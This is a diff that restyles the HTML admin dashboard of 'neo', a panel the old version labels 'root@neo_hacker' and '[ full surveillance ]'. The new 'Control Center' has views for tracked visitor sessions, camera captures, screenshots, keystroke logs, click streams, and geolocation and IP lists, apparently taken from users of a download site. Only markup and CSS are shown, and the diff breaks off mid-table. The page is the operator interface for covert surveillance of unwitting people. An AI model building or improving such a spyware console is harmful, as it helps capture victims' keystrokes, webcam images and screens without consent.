@@ -3,601 +3,592 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ADMIN // NEO</title>
+<title>neo // Control Center</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#05050a;--bg2:#0a0a14;
+  --glass:rgba(20,20,35,.55);--glass2:rgba(255,255,255,.03);
+  --border:rgba(255,255,255,.07);--border2:rgba(255,255,255,.04);
+  --txt:#e6e6f0;--txt2:#9ea3af;--txt3:#5a5f6b;
+  --indigo:#4f46e5;--violet:#9333ea;--pink:#ec4899;
+  --grad:linear-gradient(135deg,#4f46e5,#9333ea,#ec4899);
+  --green:#00c853;--blue:#6496ff;--yellow:#ffc800;--red:#ff5252;--orange:#ff7b00;
+}
 body{
-  font-family:'JetBrains Mono',monospace;
-  background:#08080e;color:#c0c0d0;min-height:100vh;padding:14px;
+  font-family:'Inter',-apple-system,sans-serif;
+  background:var(--bg);color:var(--txt);min-height:100vh;overflow-x:hidden;
+  display:flex;
 }
-.terminal-bar{
-  display:flex;align-items:center;gap:8px;margin-bottom:4px;padding-bottom:4px;
-  border-bottom:1px solid rgba(248,87,166,0.15);
+body::before{
+  content:'';position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(circle at 15% 20%,rgba(79,70,229,.08) 0%,transparent 40%),
+    radial-gradient(circle at 85% 80%,rgba(236,72,153,.06) 0%,transparent 40%);
 }
-.dot{width:10px;height:10px;border-radius:50%}
-.dot.r{background:#ff5f57}
-.dot.y{background:#ffbd2e}
-.dot.g{background:#28ca41}
-.terminal-bar .user{font-size:0.65rem;color:#555;margin-left:auto}
-h1{font-size:1.2rem;font-weight:700;color:#f857a6;letter-spacing:1px;display:inline}
-h1 span{color:#555;font-weight:400}
-.sub{font-size:0.6rem;color:#444;letter-spacing:0.3px;display:inline;margin-left:8px}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:4px}
 
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:5px;margin:10px 0}
-.card{
-  background:rgba(18,18,30,0.4);border:1px solid rgba(255,255,255,0.03);border-radius:5px;
-  padding:8px;text-align:center;
+/* ===== Sidebar ===== */
+.sidebar{
+  width:240px;min-width:240px;height:100vh;position:sticky;top:0;
+  background:rgba(10,10,20,.85);backdrop-filter:blur(20px);
+  border-right:1px solid var(--border2);padding:22px 14px;display:flex;flex-direction:column;
+  overflow-y:auto;
 }
-.card .val{font-size:1.3rem;font-weight:700;color:#f857a6}
-.card .lbl{font-size:0.5rem;color:#555;margin-top:2px;text-transform:uppercase;letter-spacing:0.3px}
+.brand{display:flex;align-items:center;gap:11px;padding:0 8px 18px;margin-bottom:8px;border-bottom:1px solid var(--border2)}
+.brand .logo-icon{width:38px;height:38px;border-radius:11px;background:var(--grad);display:flex;align-items:center;justify-content:center;font-size:1.05rem;color:#fff;box-shadow:0 0 18px rgba(147,51,234,.4)}
+.brand .b-name{font-size:1.15rem;font-weight:900;letter-spacing:-.5px;color:#fff}
+.brand .b-sub{font-size:.55rem;color:var(--txt3);letter-spacing:1.5px;text-transform:uppercase}
+.nav{display:flex;flex-direction:column;gap:3px;margin-top:6px}
+.nav-item{display:flex;align-items:center;gap:11px;padding:10px 13px;border-radius:11px;color:var(--txt2);font-size:.8rem;font-weight:500;cursor:pointer;transition:all .15s;border:1px solid transparent;text-decoration:none}
+.nav-item i{width:18px;text-align:center;font-size:.82rem;opacity:.8}
+.nav-item:hover{background:var(--glass2);color:var(--txt)}
+.nav-item.active{background:rgba(147,51,234,.14);color:#fff;border-color:rgba(147,51,234,.22);box-shadow:inset 0 0 12px rgba(147,51,234,.08)}
+.nav-item .badge{margin-left:auto;background:var(--grad);color:#fff;font-size:.55rem;font-weight:700;padding:1px 7px;border-radius:10px;min-width:18px;text-align:center}
+.side-foot{margin-top:auto;padding:12px 10px 4px;font-size:.58rem;color:var(--txt3);border-top:1px solid var(--border2);display:flex;flex-direction:column;gap:8px}
+.side-foot a{color:var(--violet);text-decoration:none;display:inline-flex;align-items:center;gap:6px;font-size:.62rem}
+.side-foot a:hover{color:var(--pink)}
 
-.section-title{
-  font-size:0.6rem;font-weight:500;color:#555;text-transform:uppercase;
-  letter-spacing:1px;margin:12px 0 5px 0;padding-bottom:3px;
-  border-bottom:1px solid rgba(255,255,255,0.03);
-  cursor:pointer;
-}
-.section-title:hover{color:#f857a6}
+/* ===== Main ===== */
+.main{flex:1;min-width:0;padding:26px 30px 60px;overflow-x:hidden}
+.topbar{display:flex;align-items:center;gap:16px;margin-bottom:24px;flex-wrap:wrap}
+.topbar h1{font-size:1.5rem;font-weight:800;letter-spacing:-.5px;color:#fff;display:flex;align-items:center;gap:10px}
+.topbar h1 .g{background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.topbar .crumb{font-size:.6rem;color:var(--txt3);letter-spacing:1px;text-transform:uppercase}
+.topbar-actions{margin-left:auto;display:flex;align-items:center;gap:10px}
+.live-pill{display:flex;align-items:center;gap:7px;padding:6px 13px;border-radius:20px;background:var(--glass);border:1px solid var(--border);font-size:.62rem;color:var(--txt2)}
+.live-dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+.btn{padding:8px 15px;border-radius:10px;font-size:.7rem;font-weight:600;cursor:pointer;border:1px solid var(--border);background:var(--glass);color:var(--txt);transition:all .15s;display:inline-flex;align-items:center;gap:7px;font-family:inherit}
+.btn:hover{background:rgba(255,255,255,.06)}
+.btn.primary{background:var(--grad);border:none;color:#fff;box-shadow:0 4px 18px rgba(147,51,234,.3)}
+.btn.primary:hover{filter:brightness(1.1)}
 
-.row{display:flex;gap:10px;flex-wrap:wrap}
-.col{flex:1;min-width:200px}
+.view{display:none;animation:fade .3s ease}
+.view.active{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
 
-.bar-item{display:flex;justify-content:space-between;padding:2px 6px;font-size:0.55rem;align-items:center}
-.bar-item .nm{color:#888}.bar-item .nm .ct{color:#444}
-.bar-track{height:2px;background:rgba(255,255,255,0.02);border-radius:2px;overflow:hidden;margin:0 6px 4px}
-.bar-fill{height:100%;background:linear-gradient(90deg,#f857a6,#ff5858);border-radius:2px;transition:width .6s}
+/* ===== Stat cards ===== */
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:14px;margin-bottom:22px}
+.stat{position:relative;padding:18px;border-radius:18px;background:var(--glass);border:1px solid var(--border);backdrop-filter:blur(16px);overflow:hidden;transition:transform .2s,border-color .2s}
+.stat:hover{transform:translateY(-3px);border-color:rgba(147,51,234,.25)}
+.stat .s-ico{position:absolute;right:14px;top:14px;font-size:1.4rem;opacity:.12}
+.stat .s-val{font-size:2rem;font-weight:900;letter-spacing:-1px;line-height:1;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.stat .s-lbl{font-size:.62rem;color:var(--txt2);margin-top:7px;text-transform:uppercase;letter-spacing:.6px;font-weight:600}
+.stat .s-sub{font-size:.55rem;color:var(--txt3);margin-top:2px}
 
-.cap-strip{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px}
-.cap-strip .cap-item{
-  width:64px;height:48px;border-radius:3px;overflow:hidden;cursor:pointer;
-  border:1px solid rgba(255,255,255,0.03);background:rgba(18,18,30,0.2);
-  position:relative;transition:border-color .15s;
-}
-.cap-strip .cap-item:hover{border-color:rgba(248,87,166,0.25)}
-.cap-strip .cap-item img{width:100%;height:100%;object-fit:cover}
-.cap-strip .cap-item .overlay{
-  position:absolute;bottom:0;left:0;right:0;
-  background:rgba(0,0,0,0.6);font-size:0.4rem;color:#aaa;padding:1px 3px;text-align:center;
-}
-.cap-strip .cap-item .del-btn{
-  position:absolute;top:1px;right:1px;width:12px;height:12px;line-height:12px;
-  text-align:center;font-size:0.45rem;color:#ff5252;background:rgba(0,0,0,0.6);
-  border-radius:2px;cursor:pointer;display:none;z-index:2;
-}
-.cap-strip .cap-item:hover .del-btn{display:block}
-.cap-strip .cap-item .del-btn:hover{background:#ff5252;color:#fff}
+/* ===== Panels ===== */
+.panel{background:var(--glass);border:1px solid var(--border);border-radius:18px;padding:18px 20px;margin-bottom:18px;backdrop-filter:blur(16px)}
+.panel-head{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+.panel-head h3{font-size:.92rem;font-weight:700;color:#fff;display:flex;align-items:center;gap:9px}
+.panel-head h3 i{color:var(--violet)}
+.panel-head .hint{margin-left:auto;font-size:.6rem;color:var(--txt3)}
 
-.table-wrap{overflow-x:auto;margin-top:4px}
-table{width:100%;border-collapse:collapse;font-size:0.55rem}
-th{text-align:left;color:#555;font-weight:500;padding:4px 5px;border-bottom:1px solid rgba(255,255,255,0.03);white-space:nowrap;letter-spacing:0.2px}
-td{padding:4px 5px;border-bottom:1px solid rgba(255,255,255,0.012);white-space:nowrap;color:#999}
-tr:hover td{background:rgba(248,87,166,0.02)}
+/* charts */
+.charts-row{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+@media(max-width:900px){.charts-row{grid-template-columns:1fr}}
+.bar-item{display:flex;align-items:center;gap:10px;padding:5px 0;font-size:.68rem}
+.bar-item .nm{flex:1;color:var(--txt2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.bar-item .ct{color:var(--txt3);font-family:'JetBrains Mono',monospace;font-size:.6rem;min-width:34px;text-align:right}
+.bar-track{flex:2;height:6px;background:rgba(255,255,255,.04);border-radius:6px;overflow:hidden;max-width:160px}
+.bar-fill{height:100%;background:var(--grad);border-radius:6px;transition:width .7s cubic-bezier(.2,.8,.2,1)}
 
-.tag{display:inline-block;padding:1px 4px;border-radius:3px;font-size:0.5rem;font-weight:500}
-.tag.suc{background:rgba(0,200,80,0.08);color:#00c853}
-.tag.err{background:rgba(255,50,50,0.08);color:#ff5252}
-.tag.cam{background:rgba(100,150,255,0.08);color:#6496ff}
+/* donut */
+.donut-wrap{display:flex;align-items:center;gap:20px}
+.donut{width:110px;height:110px;border-radius:50%;position:relative;flex-shrink:0}
+.donut::after{content:'';position:absolute;inset:18px;background:var(--bg2);border-radius:50%}
+.donut-center{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:1}
+.donut-center .dc-val{font-size:1.1rem;font-weight:800;color:#fff}
+.donut-center .dc-lbl{font-size:.5rem;color:var(--txt3);text-transform:uppercase}
+.legend{display:flex;flex-direction:column;gap:6px;font-size:.66rem}
+.legend .lg{display:flex;align-items:center;gap:7px;color:var(--txt2)}
+.legend .lg .dot{width:8px;height:8px;border-radius:3px}
+.legend .lg .lv{margin-left:auto;color:var(--txt3);font-family:'JetBrains Mono',monospace}
 
-.loc-box{
-  background:rgba(18,18,30,0.15);border:1px solid rgba(255,255,255,0.02);
-  border-radius:5px;padding:6px;font-size:0.5rem;color:#666;overflow-y:auto;max-height:180px;
-}
+/* ===== Tables ===== */
+.table-wrap{overflow-x:auto;border-radius:12px}
+table{width:100%;border-collapse:collapse;font-size:.68rem}
+thead th{text-align:left;color:var(--txt3);font-weight:600;padding:9px 10px;border-bottom:1px solid var(--border);white-space:nowrap;letter-spacing:.3px;text-transform:uppercase;font-size:.6rem;position:sticky;top:0;background:var(--bg2)}
+tbody td{padding:9px 10px;border-bottom:1px solid var(--border2);color:var(--txt2);white-space:nowrap}
+tbody tr{transition:background .12s}
+tbody tr:hover{background:rgba(147,51,234,.05)}
+.url-cell{max-width:300px;overflow:hidden;text-overflow:ellipsis;color:var(--txt)!important}
+.mono{font-family:'JetBrains Mono',monospace;color:var(--txt3)!important}
 
-.user-card{
-  display:inline-block;margin:3px;padding:4px 8px;border-radius:4px;
-  background:rgba(248,87,166,0.05);border:1px solid rgba(248,87,166,0.1);
-  font-size:0.5rem;color:#aaa;cursor:pointer;transition:all .15s;text-align:center;
-}
-.user-card:hover{background:rgba(248,87,166,0.12);color:#f857a6}
-.user-card .uc-val{color:#f857a6;font-weight:700;font-size:0.6rem}
-.user-card .uc-lbl{color:#555;font-size:0.45rem}
+.tag{display:inline-block;padding:2px 8px;border-radius:6px;font-size:.58rem;font-weight:600;letter-spacing:.2px}
+.tag.suc{background:rgba(0,200,83,.1);color:var(--green)}
+.tag.err{background:rgba(255,82,82,.1);color:var(--red)}
+.tag.view{background:rgba(100,150,255,.1);color:var(--blue)}
+.tag.dl{background:rgba(0,200,83,.1);color:var(--green)}
+.tag.cam{background:rgba(236,72,153,.1);color:var(--pink)}
 
-a{color:#f857a6;text-decoration:none}
-a:hover{text-decoration:underline}
+/* media strips */
+.media-strip{display:flex;gap:8px;flex-wrap:wrap}
+.media-strip .m{width:88px;height:66px;border-radius:9px;overflow:hidden;position:relative;border:1px solid var(--border);background:rgba(0,0,0,.3);cursor:pointer;transition:border-color .15s}
+.media-strip .m:hover{border-color:rgba(147,51,234,.4)}
+.media-strip .m img{width:100%;height:100%;object-fit:cover}
+.media-strip .m .ov{position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,.65);font-size:.48rem;color:#bbb;padding:1px 4px;text-align:center}
+.media-strip .m .del{position:absolute;top:2px;right:2px;width:15px;height:15px;line-height:15px;text-align:center;font-size:.55rem;color:var(--red);background:rgba(0,0,0,.6);border-radius:4px;display:none;z-index:2}
+.media-strip .m:hover .del{display:block}
+.media-strip .m .del:hover{background:var(--red);color:#fff}
 
-.refresh-btn{
-  position:fixed;bottom:10px;right:10px;z-index:10;
-  padding:5px 12px;border:none;border-radius:4px;
-  background:rgba(248,87,166,0.08);border:1px solid rgba(248,87,166,0.12);
-  color:#f857a6;font-family:'JetBrains Mono',monospace;
-  font-size:0.5rem;cursor:pointer;transition:all .15s;
-}
-.refresh-btn:hover{background:rgba(248,87,166,0.18)}
+/* session cards */
+.sess-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
+.sess{background:var(--glass2);border:1px solid var(--border2);border-radius:14px;padding:14px;cursor:pointer;transition:all .15s}
+.sess:hover{border-color:rgba(147,51,234,.3);background:rgba(147,51,234,.05)}
+.sess .s-top{display:flex;align-items:center;gap:9px;margin-bottom:8px}
+.sess .s-ava{width:34px;height:34px;border-radius:10px;background:var(--grad);display:flex;align-items:center;justify-content:center;color:#fff;font-size:.8rem}
+.sess .s-name{font-size:.72rem;font-weight:600;color:#fff}
+.sess .s-meta{font-size:.56rem;color:var(--txt3)}
+.sess .s-stats{display:flex;gap:14px;margin-top:8px}
+.sess .s-stats div{font-size:.6rem;color:var(--txt2)}
+.sess .s-stats b{display:block;font-size:1rem;font-weight:800;color:#fff;font-family:'JetBrains Mono',monospace}
 
-/* Modal */
-.modal-overlay{
-  display:none;position:fixed;inset:0;z-index:100;
-  background:rgba(0,0,0,0.8);backdrop-filter:blur(4px);
-  align-items:center;justify-content:center;
-}
+/* keystrokes */
+.keys-box{background:rgba(0,0,0,.3);border:1px solid var(--border2);border-radius:12px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:.66rem;color:var(--txt2);max-height:240px;overflow-y:auto;line-height:1.9;word-break:break-all}
+.keys-box .kt{color:var(--txt3);margin-right:8px}
+
+/* clicks list */
+.click-row{display:flex;align-items:center;gap:12px;padding:8px 10px;border-bottom:1px solid var(--border2);font-size:.66rem}
+.click-row .cx{width:30px;height:30px;border-radius:8px;background:rgba(255,123,0,.1);color:var(--orange);display:flex;align-items:center;justify-content:center;font-size:.7rem;flex-shrink:0}
+.click-row .ci{flex:1;color:var(--txt2)}
+.click-row .ci b{color:#fff;font-weight:600}
+.click-row .cxy{color:var(--txt3);font-family:'JetBrains Mono',monospace;font-size:.6rem}
+
+/* geo */
+.map-box{background:rgba(0,0,0,.25);border:1px solid var(--border2);border-radius:14px;padding:16px;min-height:160px}
+.geo-item{display:flex;align-items:center;gap:10px;padding:7px 0;border-bottom:1px solid var(--border2);font-size:.66rem}
+.geo-item .gpin{color:var(--pink);font-size:.8rem}
+.geo-item .gcoord{margin-left:auto;color:var(--txt3);font-family:'JetBrains Mono',monospace;font-size:.58rem}
+.ip-list{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
+.ip-chip{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--blue);background:rgba(100,150,255,.07);border:1px solid rgba(100,150,255,.12);padding:3px 9px;border-radius:8px}
+
+/* live tasks */
+.task{background:rgba(0,200,83,.04);border:1px solid rgba(0,200,83,.12);border-radius:10px;padding:10px 12px;margin-bottom:8px}
+.task .t-top{display:flex;justify-content:space-between;font-size:.64rem;color:var(--txt2)}
+.task .t-top b{color:var(--green)}
+.task .t-bar{height:4px;background:rgba(255,255,255,.05);border-radius:4px;margin-top:6px;overflow:hidden}
+.task .t-bar i{display:block;height:100%;background:linear-gradient(90deg,var(--green),#28ca41);border-radius:4px;transition:width .3s}
+
+/* modal */
+.modal-overlay{display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.82);backdrop-filter:blur(6px);align-items:center;justify-content:center}
 .modal-overlay.show{display:flex}
-.modal-box{
-  max-width:90vw;max-height:90vh;border-radius:8px;
-  border:1px solid rgba(248,87,166,0.2);overflow:hidden;
-  background:#0a0a14;position:relative;
-}
-.modal-box img,.modal-box video{max-width:90vw;max-height:85vh;display:block}
-.modal-close{
-  position:absolute;top:4px;right:8px;color:#ff5252;font-size:1rem;
-  cursor:pointer;z-index:10;background:rgba(0,0,0,0.5);border-radius:50%;
-  width:20px;height:20px;text-align:center;line-height:20px;
-}
+.modal-box{max-width:92vw;max-height:92vh;border-radius:14px;border:1px solid rgba(147,51,234,.25);overflow:hidden;background:#0a0a14;position:relative}
+.modal-box img,.modal-box video{max-width:92vw;max-height:86vh;display:block}
+.modal-close{position:absolute;top:8px;right:12px;color:var(--red);font-size:1.2rem;cursor:pointer;z-index:10;background:rgba(0,0,0,.5);border-radius:50%;width:26px;height:26px;text-align:center;line-height:26px}
 
-.back-btn{
-  display:inline-block;padding:2px 8px;margin-bottom:6px;border-radius:4px;
-  font-size:0.5rem;color:#f857a6;cursor:pointer;border:1px solid rgba(248,87,166,0.15);
-  transition:all .15s;
-}
-.back-btn:hover{background:rgba(248,87,166,0.1)}
-
-@media(max-width:700px){
-  body{padding:8px}
-  .grid{grid-template-columns:repeat(2,1fr)}
-}
+.section-title{font-size:.7rem;font-weight:700;color:var(--txt2);text-transform:uppercase;letter-spacing:1px;margin:4px 0 12px;display:flex;align-items:center;gap:8px}
+.section-title::before{content:'';width:3px;height:14px;background:var(--grad);border-radius:3px}
+.empty{text-align:center;padding:30px;color:var(--txt3);font-size:.7rem}
+.filter-bar{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:12px}
+.fbtn{padding:5px 13px;border-radius:9px;font-size:.62rem;font-weight:600;cursor:pointer;border:1px solid var(--border);background:var(--glass2);color:var(--txt2);transition:all .15s;font-family:inherit}
+.fbtn.on{background:rgba(147,51,234,.18);border-color:rgba(147,51,234,.3);color:#fff}
+.fbtn:hover{color:#fff}
+.lo-section{margin-bottom:18px}
+@media(max-width:760px){.sidebar{display:none}.charts-row{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
 
+<!-- ===== Sidebar ===== -->
+<aside class="sidebar">
+  <div class="brand">
+    <div class="logo-icon"><i class="fa-solid fa-bolt"></i></div>
+    <div>
+      <div class="b-name">neo</div>
+      <div class="b-sub">Control Center</div>
+    </div>
+  </div>
+  <nav class="nav" id="nav">
+    <a class="nav-item active" data-view="overview"><i class="fa-solid fa-gauge-high"></i> Overview</a>
+    <a class="nav-item" data-view="links"><i class="fa-solid fa-link"></i> Link History <span class="badge" id="navLinks">0</span></a>
+    <a class="nav-item" data-view="downloads"><i class="fa-solid fa-download"></i> Downloads</a>
+    <a class="nav-item" data-view="sessions"><i class="fa-solid fa-users"></i> Sessions <span class="badge" id="navSess">0</span></a>
+    <a class="nav-item" data-view="captures"><i class="fa-solid fa-camera"></i> Captures <span class="badge" id="navCap">0</span></a>
+    <a class="nav-item" data-view="screens"><i class="fa-solid fa-desktop"></i> Screenshots</a>
+    <a class="nav-item" data-view="keys"><i class="fa-solid fa-keyboard"></i> Keystrokes</a>
+    <a class="nav-item" data-view="clicks"><i class="fa-solid fa-hand-pointer"></i> Clicks</a>
+    <a class="nav-item" data-view="geo"><i class="fa-solid fa-location-dot"></i> Geo & IPs</a>
+  </nav>
+  <div class="side-foot">
+    <a href="/admin/settings"><i class="fa-solid fa-gear"></i> Settings</a>
+    <a href="/"><i class="fa-solid fa-arrow-up-right-from-square"></i> Main Site</a>
+    <a href="/admin/logout"><i class="fa-solid fa-right-from-bracket"></i> Logout</a>
+  </div>
+</aside>
+
+<!-- ===== Main ===== -->
+<main class="main">
+  <div class="topbar">
+    <div>
+      <div class="crumb" id="crumb">Dashboard / Overview</div>
+      <h1><span class="g">neo</span> Control Center</h1>
+    </div>
+    <div class="topbar-actions">
+      <div class="live-pill"><span class="live-dot"></span> <span id="liveCount">0</span> events · <span id="activeTaskCount">0</span> active</div>
+      <button class="btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i> Refresh</button>
+    </div>
+  </div>
+
+  <!-- OVERVIEW -->
+  <section class="view active" id="view-overview">
+    <div class="stats-grid" id="statsGrid"></div>
+
+    <div class="charts-row">
+      <div class="panel">
+        <div class="panel-head"><h3><i class="fa-solid fa-tower-broadcast"></i> Top Sources</h3><span class="hint">by volume</span></div>
+        <div id="sitesList"></div>
+      </div>
+      <div class="panel">
+        <div class="panel-head"><h3><i class="fa-solid fa-earth-americas"></i> Countries</h3><span class="hint">origins</span></div>
+        <div id="countriesList"></div>
+      </div>
+    </div>
+
+    <div class="charts-row">
+      <div class="panel">
+        <div class="panel-head"><h3><i class="fa-solid fa-chart-pie"></i> Mode Split</h3></div>
+        <div class="donut-wrap">
+          <div class="donut" id="modeDonut"><div class="donut-center"><span class="dc-val" id="modeTotal">0</span><span class="dc-lbl">requests</span></div></div>
+          <div class="legend" id="modeLegend"></div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-head"><h3><i class="fa-solid fa-calendar-day"></i> Daily Activity</h3></div>
+        <div id="dailyList"></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-bolt"></i> Live Downloads</h3><span class="hint" id="liveTasksHint">idle</span></div>
+      <div id="liveTasks"><div class="empty">No active downloads</div></div>
+    </div>
+  </section>
+
+  <!-- LINKS -->
+  <section class="view" id="view-links">
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-link"></i> Link History</h3><span class="hint" id="linkTotal">0 links</span></div>
+      <div class="filter-bar" id="linkFilters">
+        <button class="fbtn on" data-f="all">All</button>
+        <button class="fbtn" data-f="view">Pasted</button>
+        <button class="fbtn" data-f="download">Downloaded</button>
+      </div>
+      <div class="table-wrap">
+        <table><thead><tr><th>Time</th><th>Action</th><th>Site</th><th>URL</th><th>Mode</th><th>Status</th></tr></thead>
+        <tbody id="linksBody"></tbody></table>
+      </div>
+    </div>
+  </section>
+
+  <!-- DOWNLOADS -->
+  <section class="view" id="view-downloads">
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-download"></i> All Download Requests</h3><span class="hint" id="dlTotal">0</span></div>
+      <div class="table-wrap">
+        <table><thead><tr><th>Time</th><th>Title</th><th>URL</th><th>Mode</th><th>Status</th><th>IP</th><th>Country</th></tr></thead>
+        <tbody id="dlBody"></tbody></table>
+      </div>
+    </div>
+  </section>
+
+  <!-- SESSIONS -->
+  <section class="view" id="view-sessions">
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-users"></i> Tracked Sessions</h3><span class="hint">click to drill down</span></div>
+      <div class="sess-grid" id="sessGrid"><div class="empty">No sessions yet</div></div>
+    </div>
+    <div class="panel" id="sessDetail" style="display:none">
+      <div class="panel-head"><h3><i class="fa-solid fa-user-secret"></i> Session Detail</h3><button class="fbtn" onclick="showSessions()"><i class="fa-solid fa-arrow-left"></i> Back</button></div>
+      <div id="sessCapStrip" class="media-strip" style="margin-bottom:12px"></div>
+      <div class="section-title">Keystrokes Logged</div>
+      <div id="sessKeys" class="keys-box" style="margin-bottom:12px"></div>
+      <div class="section-title">Downloads</div>
+      <div class="table-wrap"><table><thead><tr><th>Time</th><th>Type</th><th>Title / URL</th><th>Mode</th><th>Status</th></tr></thead><tbody id="sessDlBody"></tbody></table></div>
+    </div>
+  </section>
+
+  <!-- CAPTURES -->
+  <section class="view" id="view-captures">
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-camera"></i> Camera Captures</h3><span class="hint" id="capTotal">0</span></div>
+      <div class="media-strip" id="capStrip"><div class="empty">No captures yet</div></div>
+    </div>
+  </section>
+
+  <!-- SCREENSHOTS -->
+  <section class="view" id="view-screens">
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-desktop"></i> Screen Captures</h3><span class="hint" id="screenTotal">0</span></div>
+      <div class="media-strip" id="screenStrip"><div class="empty">No screenshots yet</div></div>
+    </div>
+  </section>
+
+  <!-- KEYSTROKES -->
+  <section class="view" id="view-keys">
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-keyboard"></i> Keystroke Log</h3><span class="hint">all sessions</span></div>
+      <div class="keys-box" id="keysBox"><div class="empty">No keystrokes yet</div></div>
+    </div>
+  </section>
+
+  <!-- CLICKS -->
+  <section class="view" id="view-clicks">
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-hand-pointer"></i> Click Stream</h3><span class="hint" id="clickTotal">0</span></div>
+      <div id="clicksList"><div class="empty">No clicks yet</div></div>
+    </div>
+  </section>
+
+  <!-- GEO -->
+  <section class="view" id="view-geo">
+    <div class="charts-row">
+      <div class="panel">
+        <div class="panel-head"><h3><i class="fa-solid fa-location-dot"></i> Locations</h3><span class="hint" id="locTotal">0</span></div>
+        <div class="map-box" id="locBox"><div class="empty">No geo data yet</div></div>
+      </div>
+      <div class="panel">
+        <div class="panel-head"><h3><i class="fa-solid fa-network-wired"></i> Unique IPs</h3><span class="hint" id="ipTotal">0</span></div>
+        <div class="ip-list" id="ipBox"><div class="empty">No data</div></div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<!-- modal -->
 <div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this)closeModal()">
-  <div class="modal-box">
-    <span class="modal-close" onclick="closeModal()">&#10005;</span>
-    <div id="modalContent"></div>
-  </div>
+  <div class="modal-box"><span class="modal-close" onclick="closeModal()">&times;</span><div id="modalContent"></div></div>
 </div>
-
-<div class="terminal-bar">
-  <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
-  <span class="user">root@neo_hacker:~$</span>
-  <a href="/admin/logout" style="margin-left:auto;font-size:0.5rem;color:#ff5252;text-decoration:none;padding:2px 6px;border:1px solid rgba(255,50,50,.15);border-radius:4px">[logout]</a>
-</div>
-<h1>NEO</h1> <span class="sub">[ full surveillance ] &mdash; <span id="liveCount">0</span> events &middot; <span id="uniqueCount">0</span> IPs &middot; <span id="sessionCount">0</span> sessions</span>
-<a href="/admin/settings" style="margin-left:8px;font-size:0.5rem;color:#7c3aed;text-decoration:none;border:1px solid rgba(124,58,237,.15);padding:2px 6px;border-radius:4px;display:inline-block;vertical-align:middle">[settings]</a>
-
-<div class="grid" id="statsGrid"></div>
-
-<div class="section-title" style="color:#00c853"># live tasks <span id="activeTaskCount" style="color:#00c853">(0)</span></div>
-<div id="liveTasks" style="display:flex;flex-direction:column;gap:4px;margin-bottom:10px;min-height:18px;font-size:0.55rem">
-  <div style="color:#444;padding:4px">no active downloads</div>
-</div>
-
-<div class="row">
-  <div class="col">
-    <div class="section-title"># top sources</div>
-    <div id="sitesList"></div>
-  </div>
-  <div class="col">
-    <div class="section-title"># countries</div>
-    <div id="countriesList"></div>
-  </div>
-  <div class="col">
-    <div class="section-title"># daily activity</div>
-    <div id="dailyList"></div>
-  </div>
-  <div class="col">
-    <div class="section-title"># modes</div>
-    <div id="modesList"></div>
-  </div>
-</div>
-
-<div class="section-title" onclick="toggleSection('usersSection')"># tracked users <span id="userCount" style="color:#ffc800"></span> [toggle]</div>
-<div id="usersSection" style="display:block">
-  <div id="usersGrid" style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:6px;min-height:20px">Loading...</div>
-</div>
-
-<div id="userDetail" style="display:none">
-  <div class="back-btn" onclick="showUsers()">&larr; back to all users</div>
-  <div class="section-title"># user: <span id="userDetailLabel" style="color:#f857a6"></span></div>
-  <div class="cap-strip" id="userCapStrip"></div>
-  <div class="section-title" style="margin-top:8px"># keystrokes logged</div>
-  <div id="userKeys" style="font-size:0.5rem;color:#888;max-height:120px;overflow-y:auto;padding:4px;background:rgba(0,0,0,0.15);border-radius:4px;margin-bottom:6px;word-break:break-all"></div>
-  <div class="table-wrap" style="margin-top:6px">
-    <table><thead><tr>
-      <th>time</th><th>type</th><th>url/title</th><th>mode</th><th>status</th><th>ip</th><th>country</th><th>city</th>
